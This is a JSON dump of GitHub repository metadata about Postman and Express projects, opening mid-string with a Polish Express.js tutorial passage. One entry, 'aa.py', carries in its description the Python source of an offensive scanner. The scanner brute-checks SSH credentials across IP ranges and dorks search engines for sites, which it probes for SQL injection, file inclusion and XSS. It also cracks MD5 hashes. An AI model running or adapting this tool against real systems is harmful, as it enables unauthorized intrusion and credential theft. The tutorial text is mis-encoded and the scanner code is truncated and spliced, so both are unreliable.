jest req.params.id? req jest obiektem reprezentujƒÖcym zapytanie HTTP (ang. request). Posiada on r√≥≈ºne parametry, jak na przyk≈Çad body (czyli cia≈Ço zapytania), nag≈Ç√≥wki HTTP oraz parametry (params), kt√≥re mamy zamiar odczytaƒá.  Parametr, kt√≥ry wstawili≈õmy jako czƒô≈õƒá adresu w metodzie GET, przekazujemy jako id. W poni≈ºszym przypadku wy≈õwietli siƒô komunikat Identyfikator kt√≥ry zosta≈Ç dopisany to 123, o ile zapytanie wys≈Çano na adres http://localhost:3000/123.   Popr√≥buj z r√≥≈ºnymi innymi parametrami i sprawd≈∫ czy aplikacja dzia≈Ça tak, jak tego oczekujesz.  Obs≈Çuga b≈Çƒôdu 404 za pomocƒÖ ExpressJS Co je≈õli serwer nie rozpozna ≈ºƒÖdania? W Expressie odpowied≈∫ 404 nie jest wynikiem b≈Çƒôdu, wiƒôc nie jest wy≈Çapywany w trakcie dzia≈Çania aplikacji. Spowodowane jest to tym, ≈ºe 404 zwykle oznacza brak mo≈ºliwo≈õci wykonania danej czynno≈õci, a nie b≈ÇƒÖd wystƒôpujƒÖcy z powodu jakiej≈õ 'wpadki' programisty. Innymi s≈Çowy, Express wykona≈Ç wszystkie funkcje middleware (kt√≥re poznamy w kolejnym rozdziale) oraz route'y i dopiero wtedy dowiedzia≈Ç siƒô, ≈ºe ≈ºaden z nich nie odpowiedzia≈Ç na ≈ºƒÖdanie - taki przypadek mo≈ºemy obs≈Çu≈ºyƒá poprzez dodanie funkcji middleware na samym ko≈Ñcu (poni≈ºej pozosta≈Çych funkcji), aby obs≈Çugiwa≈Ça status 404.  Powr√≥ƒámy zn√≥w do poprzedniego szablonu z metodƒÖ GET na stronƒô domowƒÖ ('/'), kt√≥ra zwraca nam Hello world!. Dopiszmy teraz metodƒô middleware, kt√≥ra obs≈Çu≈ºy nam b≈ÇƒÖd 404.  Na samym ko≈Ñcu, poni≈ºej fragmentu z nas≈Çuchiwaniem dodajmy obs≈Çugƒô odpowiedzi 404:  app.use(function (req, res, next) {     res.status(404).send('Wybacz, nie mogli≈õmy odnale≈∫ƒá tego, czego ≈ºƒÖdasz!') }); Po ponownym uruchomieniu skryptu, w przeglƒÖdarce powiniene≈õ zobaczyƒá Hello world!. Spr√≥buj teraz dopisaƒá co≈õ na koniec adresu (tak jak w poprzednim rozdziale dopisali≈õmy id). Powiniene≈õ otrzymaƒá nastƒôpujƒÖcy komunikat:   Parametr next, kt√≥ry przekazujemy do funkcji jest funkcjƒÖ, kt√≥ra pozwala ‚Äúi≈õƒá dalej\" do kolejnej funkcji middleware lub zako≈Ñczenia ≈ºƒÖdania.  Mo≈ºna w ten spos√≥b stworzyƒá tak≈ºe obs≈Çugƒô pozosta≈Çych b≈Çƒôd√≥w. Najczƒô≈õciej obs≈Çugiwane b≈Çƒôdy to:  400 - bad request - wystƒôpuje gdy serwer nie mo≈ºe przetworzyƒá zapytania 401 - unauthorized - wystƒôpuje gdy wymagane jest uwierzytelnienie, a nie zosta≈Ço dostarczone 403 - forbidden - ≈ºƒÖdanie jest poprawne, jednak serwer odmawia odpowiedzi, mo≈ºe to wystƒÖpiƒá w przypadku gdy np. u≈ºytkownik jest zalogowany ale nie ma uprawnie≈Ñ do wykonania ≈ºƒÖdania 404 - not found - zasoby nie zosta≈Çy znalezione 500 - internal server error - wystƒôpuje gdy wystƒôpujƒÖ nieznane warunki i nie ma ≈ºadnej konkretnej wiadomo≈õci Zadanie: Operacje CRUD na pliku JSON Stw√≥rzmy teraz aplikacjƒô, kt√≥ra bƒôdzie otwieraƒá zewnƒôtrzne pliki .json oraz edytowaƒá je. Zanim zaczniemy, w folderze projektu stw√≥rz plik server.js, a nastƒôpnie zainicjalizuj projekt poprzez wpisanie npm init w konsoli.  Przejd≈∫my do pobrania potrzebnych zale≈ºno≈õci - tym razem bƒôdzie nam potrzebny Express oraz body-parser. Jak siƒô zapewne domy≈õlasz, mo≈ºesz zainstalowaƒá je za pomocƒÖ komendy npm install --save express body-parser. Po pobraniu paczek, mo≈ºemy ≈õmia≈Ço przej≈õƒá do pisania kodu - na poczƒÖtek przypisz zale≈ºno≈õci do zmiennych w pliku server.js. Dodaj tak≈ºe linijkƒô var fs = require('fs') - fs bƒôdzie nam potrzebny do operacji na plikach. Nie musimy go instalowaƒá, bo jest on wbudowany w Node :)  Skoro zale≈ºno≈õci mamy ju≈º za≈Çatwione, zadeklaruj zmiennƒÖ app, kt√≥ra wywo≈Ça funkcjƒô express() oraz zmiennƒÖ stringifyFile (na razie bez zadeklarowanej warto≈õci).  Tu≈º pod deklaracjƒÖ zmiennych dodaj tak≈ºe linijkƒô app.use(bodyParser.json()); - to pozwoli Ci wykorzystaƒá middleware body-parser, kt√≥re zainstalowali≈õmy przed chwilƒÖ. body-parser jest nam potrzebny, aby korzystaƒá z formatu application/json - p√≥ki co nie przejmuj siƒô pojƒôciem middleware, zajmiemy siƒô nim nieco dalej w tym kursie :)  Stw√≥rz teraz endpoint GET /getNote, gdzie po wywo≈Çaniu zostanie wczytany Tw√≥j zewnƒôtrzny plik JSON oraz wy≈õwietlona zostanie jego zawarto≈õƒá. Przyk≈ÇƒÖdowy plik test.json:  {\"menu\": {    \"id\": \"file\",    \"value\": \"File\",    \"popup\": {      \"menuitem\": [        {\"value\": \"New\", \"onclick\": \"CreateNewDoc()\"},        {\"value\": \"Open\", \"onclick\": \"OpenDoc()\"},        {\"value\": \"Close\", \"onclick\": \"CloseDoc()\"}      ]    }  }} Metoda kt√≥ra pozwoli nam na odczytanie pliku to readFile, kt√≥rƒÖ mo≈ºna wywo≈Çaƒá z zadeklarowanego wcze≈õniej fs. Jako parametry przyjmuje ona najpierw plik, nastƒôpnie opcje (np. kodowanie) i funkcjƒô, kt√≥ra wywo≈Ça siƒô po za≈Çadowaniu. W naszym przypadku bƒôdzie to wiƒôc nastƒôpujƒÖcy kod: fs.readFile('./test.json', 'utf8', function(err, data) {     if (err) throw err;     stringifyFile = data     res.send(data); }); Teraz pora na stworzenie endpointa, kt√≥ry po wywo≈Çaniu nadpisze nam podany plik. Stworzymy do tego dynamiczny endpoint, kt√≥ry dopisze do pliku string, kt√≥ry przeka≈ºemy jako parametr. Stw√≥rz tym razem POST na /updateNote/:note. Po jego wywo≈Çaniu tekst, kt√≥ry znajduje siƒô w miejscu /:note powinni≈õmy dopisaƒá do wczytanego pliku poprzez dodanie req.params.note do zmiennej stringifyFile, kt√≥ra przechowuje aktualnƒÖ zawarto≈õƒá pliku.  Po przypisaniu powy≈ºszej zmiennej, nale≈ºy ponownie odwo≈Çaƒá siƒô do modu≈Çu fs tym razem u≈ºywajƒÖc metody writeFile. Pomo≈ºe nam w tym nastƒôpujƒÖcy fragment kodu:  fs.writeFile('./test.json', stringifyFile, function(err) {     If (err) throw err;     console.log('file updated'); }); Na ko≈Ñcu pliku dodaj nas≈Çuchiwanie na porcie 3000.  Zapisz plik i uruchom aplikacjƒô wpisujƒÖc node server.js w konsoli.  Otw√≥rz Postmana, ustaw metodƒô zapytania na GET, a w pole adresu wpisz http://localhost:3000/getNote. Jako response powiniene≈õ otrzymaƒá Tw√≥j stworzony wcze≈õniej plik JSON. Po zmianie z GET na POST oraz wpisaniu /updateNote/test zamiast /getNote oraz wys≈Çaniu requesta, Tw√≥j plik JSON powinien zostaƒá zaktualizowany o s≈Çowo test :)  Po uko≈Ñczeniu zadania, wrzuƒá sw√≥j kod na Githuba i przeka≈º link do repozytorium mentorowi :)  PodglƒÖd zadania  https://github.com/martinproxy0/Zadanie_17_3.git   Wyslij link  17.4. Serwowanie plik√≥w statycznych Express posiada wbudowanƒÖ mo≈ºliwo≈õƒá serwowania plik√≥w statycznych - takimi plikami sƒÖ na przyk≈Çad obrazki, pliki CSS czy JS. Aby serwowaƒá te pliki statycznie, wystarczy u≈ºyƒá express.static. Pliki statyczne to pliki, kt√≥re zostajƒÖ dostarczone do klienta bez generowania, modyfikacji czy przetwarzania - jedyne, co trzeba z nimi zrobiƒá, to przekazaƒá nazwƒô katalogu, w kt√≥rym sƒÖ przetrzymywane, do express.static - to wystarczy aby zaczƒÖƒá je serwowaƒá. Spr√≥bujmy przedstawiƒá to sobie na przyk≈Çadzie.  Za≈Ç√≥≈ºmy, ≈ºe przetrzymujesz swoje zdjƒôcia i pliki CSS w katalogu assets/. Aby zaczƒÖƒá je serwowaƒá, mo≈ºesz wiƒôc u≈ºyƒá nastƒôpujƒÖcej linijki:  app.use(express.static('assets')); Zmodyfikujmy wiƒôc ca≈Çkowicie naszƒÖ aplikacjƒô. Najpierw stw√≥rzmy w katalogu projektu nowy katalog o nazwie assets/. Wrzuƒámy do niego jakiekolwiek zdjƒôcie/obrazek. W pliku server.js wr√≥ƒámy do poprzedniego stanu (zanim zaczƒôli≈õmy zajmowaƒá siƒô routingiem):  var express = require('express'); var app = express();  app.get('/', function (req, res) {     res.send('Hello world'); });  var server = app.listen(3000, 'localhost', function() {     var host = server.address().address;     var port = server.address().port;      console.log('Przyk≈Çadowa aplikacja nas≈Çuchuje na http://' + host + ':' + port); }); W tym przyk≈Çadzie sami definiujemy port i adres, ale w prawdziwej aplikacji mogliby≈õmy tych warto≈õci nie znaƒá. Czƒôstym przyk≈Çadem jest sytuacja w kt√≥rej adres i port sƒÖ zdefiniowane w osobnym pliku konfiguracyjnym. Ten plik by≈Çby inny na naszym komputerze ni≈º na serwerze na kt√≥rym bƒôdziemy publikowaƒá aplikacjƒô - ale nasz kod ma dzia≈Çaƒá w obu lokalizacjach. Dlatego do wy≈õwietlenia linka potrzebowaliby≈õmy pobrania tych danych za pomocƒÖ metody .address().  Pozostaje teraz jedynie w linii nr 3 dodaƒá to, o czym powiedzieli≈õmy sobie chwilkƒô temu, czyli linijkƒô app.use(express.static('assets'));  Dla przypomnienia, w nawiasach do express.static przekazujemy katalog, w kt√≥rym znajdujƒÖ siƒô pliki, kt√≥re chcemy serwowaƒá. Po zapisaniu pliku server.js, mo≈ºemy uruchomiƒá aplikacjƒô. Teraz, aby zobaczyƒá nasz obrazek, wystarczy ≈ºe po http://localhost:3000/ podamy nazwƒô pliku z rozszerzeniem - u mnie wyglƒÖda to tak:   Stw√≥rz sobie teraz prosty plik index.html, kt√≥ry bƒôdzie mia≈Ç formularz z dwoma inputami typu text (o nazwach first_name i last_name) oraz jednym typu submit. Element  posiada atrybuty takie jak action oraz method. Atrybut action pozwala okre≈õliƒá, gdzie wys≈Çaƒá dane z formularza w momencie, gdy zostanie on zatwierdzony. W naszym przypadku bƒôdzie to http://localhost:3000/userform. Atrybut method okre≈õla metodƒô, jakiej chcemy u≈ºyƒá - w naszym przypadku niech bƒôdzie to GET.  Przyk≈Çadowo, Tw√≥j index.html mo≈ºe wyglƒÖdaƒá tak:                          Node Hello world example                                                 First Name:                                            Last Name:                                           Gdy ju≈º bƒôdzie gotowy, wrzuƒá go do katalogu /assets.  Teraz czas na modyfikacjƒô pliku server.js. Najpierw zmie≈Ñmy to, co chcemy wysy≈Çaƒá, gdy zostanie wys≈Çane ≈ºƒÖdanie do strony domowej.  Zamie≈Ñ wiƒôc res.send('Hello world') na res.sendFile('/index.html') - jak siƒô zapewne domy≈õlasz, res.sendFile() wysy≈Ça w odpowiedzi plik zamiast wiadomo≈õci.  Musimy r√≥wnie≈º dodaƒá obs≈Çugƒô ≈ºƒÖdania na endpoint, do kt√≥rego bƒôdziemy kierowaƒá nasz formularz.  app.get('/userform', function (req, res) {     const response = {         first_name: req.query.first_name,         last_name: req.query.last_name     };     res.end(JSON.stringify(response)); }); W czasie przetwarzania ≈ºƒÖdania, tworzymy nowy obiekt response, kt√≥ry ma klucze first_name oraz last_name. Do poszczeg√≥lnych w≈Ça≈õciwo≈õci przypisujemy dane, kt√≥re otrzymujemy w obiekcie req (od ang. request), czyli w obiekcie z ≈ºƒÖdaniem. Na koniec wy≈õwietlamy nasz obiekt przetworzony na typ string za pomocƒÖ metody JSON.stringify. Po zapisaniu pliku server.js, aplikacja powinna pokazywaƒá formularz, jak poni≈ºej.   Po wpisaniu warto≈õci do input√≥w i wys≈Çaniu ich, powiniene≈õ zostaƒá przekierowany do strony /userform, a po znaku zapytania powinny zostaƒá wy≈õwietlone parametry umieszczone przez Ciebie w inputach.   Zadanie: ≈ªonglujemy danymi pomiƒôdzy endpointami Napisz kod obs≈ÇugujƒÖcy formularz zgodnie z wskaz√≥wkami z tego submodu≈Çu, a nastƒôpnie wy≈õlij sw√≥j kod na repozytorium oraz przeka≈º go do sprawdzenia mentorowi.  PodglƒÖd zadania  https://github.com/martinproxy0/Zadanie_17_4.git   Wyslij link 17.5. Middleware - po≈õrednik miƒôdzy ≈ºƒÖdaniem a odpowiedziƒÖ",
    "fork": false,
    "created_at": "2018-01-26T19:03:05Z",
    "updated_at": "2018-01-26T19:03:38Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 13038633,
    "owner_login": "martinproxy0",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/13038633?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "repo",
      "data",
      "request",
      "form",
      "file",
      "application",
      "server",
      "call",
      "node",
      "json",
      "http",
      "user",
      "develop",
      "express",
      "auto",
      "example",
      "automat",
      "implement",
      "format",
      " express",
      "auth",
      "endpoint",
      "framework",
      "route",
      "https",
      "function",
      "demo",
      "send",
      "local",
      "list",
      "star",
      "source",
      "read",
      "front",
      "update",
      "response",
      "stat",
      "host",
      "start",
      "delete",
      "face",
      "package",
      "method",
      "info",
      "developer",
      "system",
      "name",
      "html",
      "action",
      "module",
      "program",
      "infor",
      "github",
      "model",
      "tech",
      "esse",
      "text",
      "getpost",
      "problem",
      "install",
      "parse",
      "link",
      "proxy",
      "folder",
      "status",
      "require",
      "middleware",
      "parser",
      "console",
      "intern",
      "note",
      "popular",
      "party",
      "write",
      "query",
      "sets",
      "updated",
      "dynamic",
      "modules",
      "routing",
      "role",
      "world",
      "address",
      "dependencies",
      "found",
      "error",
      "internal",
      "listen",
      "jest",
      "kurs",
      "rake",
      "ekspresowe",
      "kazan",
      "wars"
    ]
  },
  {
    "id": 17645181,
    "name": "aa.py",
    "full_name": "udinparla/aa.py",
    "description": "#!/usr/bin/env python import re import hashlib import Queue from random import choice import threading import time import urllib2 import sys import socket  try:     import paramiko      PARAMIKO_IMPORTED = True except ImportError:     PARAMIKO_IMPORTED = False    USER_AGENT = [\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3\",              \"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\",              \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\",              \"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\",              \"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\", \t     \"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.38.6 (KHTML, like Gecko) Version/5.1 Safari/535.38.6\", \t     \"Mozilla/5.0 (Macintosh; U; U; PPC Mac OS X 10_6_7 rv:6.0; en-US) AppleWebKit/532.23.3 (KHTML, like Gecko) Version/4.0.2 Safari/532.23.3\"             ] option = ' ' vuln = 0 invuln = 0 np = 0 found = []   class Router(threading.Thread):     \"\"\"Checks for routers running ssh with given User/Pass\"\"\"     def __init__(self, queue, user, passw):         if not PARAMIKO_IMPORTED:             print 'You need paramiko.'             print 'http://www.lag.net/paramiko/'             sys.exit(1)         threading.Thread.__init__(self)              self.queue = queue          self.user = user         self.passw = passw       def run(self):         \"\"\"Tries to connect to given Ip on port 22\"\"\"         ssh = paramiko.SSHClient()         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())         while True:             try:                 ip_add = self.queue.get(False)              except Queue.Empty:                 break             try:                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)                 ssh.close()                 print \"Working: %s:22 - %s:%s\\n\" % (ip_add, self.user, self.passw)                 write = open('Routers.txt', \"a+\")                 write.write('%s:22 %s:%s\\n' % (ip_add, self.user, self.passw))                 write.close()                   self.queue.task_done()              except:                 print 'Not Working: %s:22 - %s:%s\\n' % (ip_add, self.user, self.passw)                 self.queue.task_done()                               class Ip:     \"\"\"Handles the Ip range creation\"\"\"     def __init__(self):         self.ip_range = []         self.start_ip = raw_input('Start ip: ')         self.end_ip = raw_input('End ip: ')         self.user = raw_input('User: ')         self.passw = raw_input('Password: ')         self.iprange()             def iprange(self):         \"\"\"Creates list of Ip's from Start_Ip to End_Ip\"\"\"         queue = Queue.Queue()         start = list(map(int, self.start_ip.split(\".\")))         end = list(map(int, self.end_ip.split(\".\")))         tmp = start                 self.ip_range.append(self.start_ip)         while tmp != end:             start[3] += 1             for i in (3, 2, 1):                 if tmp[i] == 256:                     tmp[i] = 0                     tmp[i-1] += 1             self.ip_range.append(\".\".join(map(str, tmp)))                 for add in self.ip_range:             queue.put(add)          for i in range(10):             thread = Router(queue, self.user, self.passw )             thread.setDaemon(True)             thread.start()          queue.join()   class Crawl:     \"\"\"Searches for dorks and grabs results\"\"\"     def __init__(self):         if option == '4':             self.shell = str(raw_input('Shell location: '))         self.dork = raw_input('Enter your dork: ')         self.queue = Queue.Queue()         self.pages = raw_input('How many pages(Max 20): ')         self.qdork = urllib2.quote(self.dork)         self.page = 1         self.crawler()         def crawler(self):         \"\"\"Crawls Ask.com for sites and sends them to appropriate scan\"\"\"         print '\\nDorking...'         for i in range(int(self.pages)):             host = \"http://uk.ask.com/web?q=%s&page=%s\" % (str(self.qdork), self.page)             req = urllib2.Request(host)             req.add_header('User-Agent', choice(USER_AGENT))             response = urllib2.urlopen(req)             source = response.read()             start = 0             count = 1             end = len(source)             numlinks = source.count('_t\" href', start, end)               while count alert('xssBYm0le');\"\"\"         self.file = 'xss.txt'       def run(self):         \"\"\"Checks Url for possible Xss\"\"\"         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if '=' in site:                 global vuln                 global invuln                 global np                 xsite = site.rsplit('=', 1)[0]                 if xsite[-1] != \"=\":                     xsite = xsite + \"=\"                 test = xsite + self.xchar                 try:                     conn = urllib2.Request(test)                     conn.add_header('User-Agent', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(\"xssBYm0le\", data, re.I)):                         self.xss(test)                         vuln += 1                     else:                         print B+test + W+' > ' + str(vuln) + G+' Vulnerable Sites Found' + W     print '>> ' + str(invuln) + G+' Sites Not Vulnerable' + W     print '>> ' + str(np) + R+' Sites Without Parameters' + W     if option == '1':         print '>> Output Saved To sqli.txt\\n'     elif option == '2':         print '>> Output Saved To lfi.txt'     elif option == '3':         print '>> Output Saved To xss.txt'     elif option == '4':         print '>> Output Saved To rfi.txt'     W  = \"\\033[0m\";   R  = \"\\033[31m\";  G  = \"\\033[32m\";  O  = \"\\033[33m\";  B  = \"\\033[34m\";  def main():     \"\"\"Outputs Menu and gets input\"\"\"     quotes = [ \t'\\nm0le@tormail.org\\n'         ]     print (O+''' ------------- -- SecScan -- --- v1.5 ---- ---- by ----- --- m0le ---- -------------''')     print (G+''' -[1]-  SQLi -[2]-  LFI -[3]-  XSS -[4]-  RFI -[5]-  Proxy -[6]-  Admin Page Finder -[7]-  Sub Domain Scan -[8]-  Dictionary MD5 cracker -[9]-  Online MD5 cracker -[10]- Check your IP address''')      print (B+''' -[!]- If freeze while running or want to quit,  just Ctrl C, it will automatically terminate the job. ''')     print W     global option     option = raw_input('Enter Option: ')       if option:         if option == '1':             Crawl()             output()             print choice(quotes)                      elif option == '2':             Crawl()             output()             print choice(quotes)           elif option == '3':             Crawl()             output()             print choice(quotes)           elif option == '4':             Crawl()             output()             print choice(quotes)               elif option == '5':             Ip()             print choice(quotes)           elif option == '6':             admin()             aprint()             print choice(quotes)          elif option == '7':             subd()             print choice(quotes)          elif option == '8':             word()             print choice(quotes)            elif option == '9':             OnlineCrack().crack()             print choice(quotes)                              elif option == '10':             Check().grab()               print choice(quotes)                 else:             print R+'\\nInvalid Choice\\n' + W             time.sleep(0.9)             main()           else:         print R+'\\nYou Must Enter An Option (Check if your typo is corrected.)\\n' + W         time.sleep(0.9)         main()     if __name__ == '__main__':     main()",
    "fork": false,
    "created_at": "2014-03-11T20:35:08Z",
    "updated_at": "2019-11-23T18:43:58Z",
    "stargazers_count": 4,
    "watchers_count": 4,
    "forks": 0,
    "watchers": 4,
    "score": 1,
    "owner_id": 6923150,
    "owner_login": "udinparla",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/6923150?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "file",
      "call",
      "http",
      "user",
      "auto",
      "automat",
      "mail",
      "line",
      "help",
      "route",
      "build",
      "send",
      "list",
      "site",
      "star",
      "source",
      "read",
      "import",
      "running",
      "response",
      "host",
      "start",
      "python",
      "connect",
      "need",
      "shop",
      "name",
      "html",
      "task",
      "search",
      "open",
      "print",
      "result",
      "main",
      "class",
      "automatic",
      "link",
      "header",
      "results",
      "creation",
      "done",
      "find",
      "given",
      "automatically",
      "many",
      "write",
      "location",
      "free",
      "router",
      "output",
      "gets",
      "sends",
      "correct",
      "while",
      "address",
      "pages",
      "found",
      "admin",
      "reading",
      "google",
      "random",
      "seek",
      "crawler",
      "grab"
    ]
  },
  {
    "id": 8958292,
    "name": "django-postman",
    "full_name": "juannorris/django-postman",
    "description": "django-postman, customized by scoobygalletas (https://scoobygalletas@bitbucket.org/scoobygalletas), exported to git from hg.",
    "fork": false,
    "created_at": "2013-03-22T18:33:59Z",
    "updated_at": "2014-06-26T03:19:29Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 1682951,
    "owner_login": "juannorris",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/1682951?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "https",
      "export",
      "custom",
      "exported",
      "django",
      "bucket",
      "bitbucket",
      "customized"
    ]
  },
  {
    "id": 201312005,
    "name": "food-delivery-server-goit",
    "full_name": "SerhiiY/food-delivery-server-goit",
    "description": "A course task with using node.js server. All queries were tested by Postman. App can give products list or user by id and write a new product or user to the database. On master branch used http module, on express-hw branch express.js is used.",
    "fork": false,
    "created_at": "2019-08-08T18:06:53Z",
    "updated_at": "2019-09-10T10:36:12Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 34281627,
    "owner_login": "SerhiiY",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/34281627?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "server",
      "node",
      "database",
      "http",
      "user",
      "express",
      " express",
      "tested",
      "list",
      "course",
      "task",
      "module",
      "product",
      "were",
      "queries",
      "products",
      "write",
      "master"
    ]
  },
  {
    "id": 174249180,
    "name": "newman-reporter-diff",
    "full_name": "indeedeng-alpha/newman-reporter-diff",
    "description": "Showcase for comparing http requests using newman, the postman cli client.",
    "fork": false,
    "created_at": "2019-03-07T01:33:49Z",
    "updated_at": "2019-03-07T01:36:38Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 31606812,
    "owner_login": "indeedeng-alpha",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/31606812?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "request",
      "client",
      "requests",
      "http",
      "newman",
      "case",
      "comparing"
    ]
  },
  {
    "id": 99124287,
    "name": "postman-gmail-extension",
    "full_name": "WPPlugins/postman-gmail-extension",
    "description": "This is a mirror of the svn repo: https://plugins.svn.wordpress.org/postman-gmail-extension/, the master is always the latest release.",
    "fork": false,
    "created_at": "2017-08-02T14:16:01Z",
    "updated_at": "2017-08-02T14:16:15Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 17740254,
    "owner_login": "WPPlugins",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/17740254?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "repo",
      "http",
      "mail",
      "https",
      "extension",
      "plugin",
      "latest",
      "master",
      "release",
      "always",
      "mirror",
      "wordpress"
    ]
  },
  {
    "id": 225575258,
    "name": "swagger.io-openAPI",
    "full_name": "rohitchatla/swagger.io-openAPI",
    "description": "For more Nodejs,JavaScript projects :: goto https://github.com/thunderssilver to see our team projects listed as following:: 1)stud_form with nodeJS,mysql 2)swagger.io/openAPI 3)socket1 4)restapiauth: (nodeJS,expressJS with routes,private routes,auth(JWT),validations(Joi@hapi),password hashing with bcryptjs,data/codes hiding with dotenv lib,MongoDb(mongoose connect) as DB) 5)restapi: (MongoDb as DB) 6)sample_postman 7)oauth2.0 with google,facebook 8)oauth2.0 with local strategy",
    "fork": false,
    "created_at": "2019-12-03T09:02:53Z",
    "updated_at": "2019-12-04T07:27:19Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 51963891,
    "owner_login": "rohitchatla",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/51963891?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "form",
      "rest",
      "node",
      "http",
      "express",
      "code",
      "mongo",
      "auth",
      "route",
      "https",
      "sample",
      "local",
      "list",
      "routes",
      "more",
      "swagger",
      "connect",
      "face",
      "mysql",
      "book",
      "github",
      "open",
      "mongoose",
      "under",
      "validation",
      "following",
      "mysql ",
      "codes",
      "projects",
      "restapi",
      "google",
      "bcrypt",
      "private",
      "oauth2",
      "hapi",
      "oauth"
    ]
  },
  {
    "id": 102051898,
    "name": "python-google-pubsub",
    "full_name": "bennzhang/python-google-pubsub",
    "description": null,
    "fork": false,
    "created_at": "2017-08-31T22:47:26Z",
    "updated_at": "2018-01-27T00:27:40Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25533990,
    "owner_login": "bennzhang",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/25533990?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 156440463,
    "name": "medium-Tdd-Js-Swggr-Dckr",
    "full_name": "testProjekten/medium-Tdd-Js-Swggr-Dckr",
    "description": "Implementing this post Project https://medium.com/nycdev/agile-and-test-driven-development-tdd-with-swagger-docker-github-postman-newman-and-jenkins-347bd11d5069",
    "fork": false,
    "created_at": "2018-11-06T20:04:00Z",
    "updated_at": "2018-11-06T20:09:02Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 44818180,
    "owner_login": "testProjekten",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/44818180?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "http",
      "develop",
      "newman",
      "https",
      "swagger",
      "development",
      "github",
      "docker",
      "drive",
      "jenkins",
      "driven",
      "agile"
    ]
  },
  {
    "id": 64825780,
    "name": "api_laravel",
    "full_name": "ramadhan22/api_laravel",
    "description": "Link postman https://www.getpostman.com/collections/ecb538f54650f76a4444",
    "fork": false,
    "created_at": "2016-08-03T07:37:47Z",
    "updated_at": "2017-07-20T13:26:20Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 17599459,
    "owner_login": "ramadhan22",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/17599459?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "collections",
      "http",
      "https",
      "getpost"
    ]
  },
  {
    "id": 207091776,
    "name": "practice-3",
    "full_name": "martynow173/practice-3",
    "description": "Just backend requests handling, use postman. Additional functionality and code refactoring: user ratings, comments, sorting based on them, many-to-many relationship between categories and products. Role system - https://github.com/spatie/laravel-permission",
    "fork": false,
    "created_at": "2019-09-08T09:47:16Z",
    "updated_at": "2019-09-16T15:06:28Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25533512,
    "owner_login": "martynow173",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/25533512?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "request",
      "requests",
      "http",
      "user",
      "based",
      "code",
      "https",
      "function",
      "functional",
      "backend",
      "rating",
      "system",
      "github",
      "laravel",
      "product",
      "between",
      "functionality",
      "handling",
      "many",
      "actor",
      "products",
      "sort",
      "comments",
      "relationship"
    ]
  },
  {
    "id": 248834398,
    "name": "GameStoreSpring",
    "full_name": "InLove4Coding/GameStoreSpring",
